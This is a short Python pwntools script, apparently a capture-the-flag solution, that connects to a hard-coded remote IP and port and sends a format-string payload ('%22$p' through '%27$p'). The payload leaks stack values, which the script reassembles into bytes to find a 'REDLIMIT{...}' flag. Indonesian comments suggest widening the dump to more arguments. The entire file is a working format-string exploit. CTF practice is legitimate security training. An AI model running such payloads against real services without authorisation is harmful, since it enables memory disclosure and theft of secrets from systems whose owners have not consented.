from pwn import *
import re

context.arch = 'amd64'
context.log_level = 'info'

HOST = '165.99.163.122'
PORT = 7015

io = remote(HOST, PORT)

io.recvuntil(b'Say something:\n')

payload = b'%22$p.%23$p.%24$p.%25$p.%26$p.%27$p\x00'
io.send(payload)

data = io.recvall(timeout=5)
print("[RAW OUTPUT]")
print(data)

leaks = re.findall(rb'0x[0-9a-fA-F]+', data)
print("[LEAKS]", leaks)

flag_bytes = b''
for h in leaks[:6]:
    val = int(h, 16)
    flag_bytes += p64(val)

print("[RECONSTRUCTED]", flag_bytes)

m = re.search(rb'REDLIMIT\{[^}]+\}', flag_bytes)
if m:
    print("\n[+] FLAG:", m.group(0).decode())
else:
    print("\n[-] Flag tidak ditemukan, coba dump lebih banyak argumen.")
    print("[i] Hint: coba payload '%6$p.%7$p...%30$p' lalu cari 'REDLIMIT' secara manual.")
